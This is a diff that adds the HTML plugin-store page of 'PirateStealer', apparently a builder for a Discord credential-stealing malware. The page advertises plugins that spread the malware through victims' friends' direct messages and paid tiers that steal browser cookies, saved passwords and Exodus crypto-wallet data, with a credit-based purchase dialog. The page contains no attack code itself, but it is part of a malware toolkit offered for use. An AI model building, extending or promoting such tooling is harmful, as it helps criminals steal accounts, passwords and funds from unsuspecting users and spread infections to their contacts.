@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>PirateStealer - Build</title>
+
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+	<link rel="stylesheet" type="text/css" media="screen" href="css/main.css" />
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+
+	<script src="js/particles.js"></script>
+	<script defer src="js/plugins.js"></script>
+</head>
+
+<body>
+	<div class="modal-backdrop">
+		<div class="modal">
+			<div class="title">
+				<span class="muted">Are you sure that you want to buy <span class="normal">%PLUGIN_NAME%</span></span>
+			</div>
+			<div class="price">
+				<span class="muted">Price: <span class="normal">%PLUGIN_PRICE% $tanCredit</span></span>
+			</div>
+			<div class="buttons">
+				<button class="modal_button core_button">Yes</button>
+				<button class="modal_button core_button danger">
+					No
+				</button>
+			</div>
+		</div>
+	</div>
+
+	<div class="floating_toolbar">
+		<div class="fbtl_container">
+			<a class="tool_button" href="https://discord.gg/grabber" target="_blank" rel="noopener">
+				<span class="material-icons">diamond</span>
+			</a>
+			<a class="tool_button" href="/home.html">
+				<span class="material-icons">home</span>
+			</a>
+			<a class="tool_button" href="/build.html">
+				<span class="material-icons">plumbing</span>
+			</a>
+			<a class="tool_button" href="/settings.html">
+				<span class="material-icons">tune</span>
+			</a>
+			<a class="tool_button active" href="/plugins.html">
+				<span class="material-icons">extension</span>
+			</a>
+			<a class="tool_button" href="/login.html">
+				<span class="material-icons">login</span>
+			</a>
+		</div>
+	</div>
+
+	<div class="page_header">
+		<div class="stancredit">
+			<span id="balance" class="balance">%BALANCE% $tanCredit</span>
+			<img src="./assets/stancredit.svg" draggable="false" />
+		</div>
+	</div>
+
+	<main>
+		<div class="plugin_container">
+			<div class="plugin_item" plugin="classicPirateStealer">
+				<div class="plugin_name">
+					Classic PirateStealer
+					<img class="plugin_icon" src="./assets/verified.svg" draggable="false" />
+				</div>
+				<div class="plugin_description">
+					<span>Official & Default Plugin</span>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button use">Use</button>
+					<span class="plugin_credits">
+						By <a href="https://github.com/Stanley-GF" target="_blank">Stanley</a> & Bytixo
+					</span>
+				</div>
+			</div>
+			<div class="plugin_item" plugin="rickroll">
+				<div class="plugin_name">
+					RickRoll
+					<img class="plugin_icon" src="./assets/verified.svg" draggable="false" />
+				</div>
+				<div class="plugin_description">
+					<span>Just a funny plugin, rickroll people</span>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button use">Use</button>
+					<span class="plugin_credits">By <a href="https://github.com/Stanley-GF"
+							target="_blank">Stanley</a></span>
+				</div>
+			</div>
+			<div class="plugin_item" plugin="autoDM">
+				<div class="plugin_name">
+					AutoDM
+					<img class="plugin_icon" src="./assets/verified.svg" draggable="false" />
+				</div>
+
+				<div class="plugin_description">
+					<span>
+						Automatically spread the malware in friends DMs
+					</span>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button use">Use</button>
+					<span class="plugin_credits">By <a href="https://github.com/Stanley-GF"
+							target="_blank">Stanley</a></span>
+				</div>
+			</div>
+			<div class="plugin_item" plugin="classicPSPremium">
+				<div class="plugin_name">
+					Classic PS Premium
+					<img class="plugin_icon" src="./assets/paid.svg" draggable="false" />
+				</div>
+				<div class="plugin_description">
+					<ul>
+						<li>Browser Cookies</li>
+						<li>Browser Passwords</li>
+						<li>AutoBard</li>
+						<li>AutoSecure</li>
+					</ul>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button buy">Buy</button>
+					<span class="plugin_credits">By <a href="https://github.com/Stanley-GF"
+							target="_blank">Stanley</a></span>
+				</div>
+			</div>
+			<div class="plugin_item" plugin="classicPSCanary">
+				<div class="plugin_name">
+					Classic PS Canary
+					<img class="plugin_icon" src="./assets/paid.svg" draggable="false" />
+				</div>
+				<div class="plugin_description">
+					<ul>
+						<li>Browser Cookies</li>
+						<li>Browser Passwords</li>
+						<li>AutoBard</li>
+						<li>AutoSecure</li>
+						<li>Exodus Stealer</li>
+					</ul>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button buy">Buy</button>
+					<span class="plugin_credits">By <a href="https://github.com/Stanley-GF"
+							target="_blank">Stanley</a></span>
+				</div>
+			</div>
+			<div class="plugin_item" plugin="example">
+				<div class="plugin_name">
+					Example
+					<img class="plugin_icon" src="./assets/notverified.svg" draggable="false" />
+				</div>
+				<div class="plugin_description">
+					<span>- List of features</span>
+				</div>
+				<div class="plugin_status">
+					<button class="plugin_button use">Use</button>
+					<span class="plugin_credits">By 0x007</span>
+				</div>
+			</div>
+		</div>
+		<div id="particles-js"></div>
+	</main>
+
+	<footer>&copy; PirateStealer 2021</footer>
+</body>
+
+</html>
